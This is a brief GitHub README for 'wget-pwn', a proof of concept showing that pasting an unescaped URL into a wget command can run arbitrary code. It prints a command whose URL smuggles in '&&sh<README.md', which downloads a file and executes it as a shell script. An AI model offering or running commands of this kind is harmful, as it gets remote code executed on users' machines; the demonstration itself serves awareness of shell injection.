wget-pwn
=========


A click on the following link in your webbrowser will only display this readme file.


[README.md](https://raw.githubusercontent.com/markus-perl/wget-pwn/master/file/README.md&&sh<README.md)


But downloading this link unescaped with wget will execute arbitary code.


    wget --no-check-certificate https://raw.githubusercontent.com/markus-perl/wget-pwn/master/file/README.md&&sh<README.md
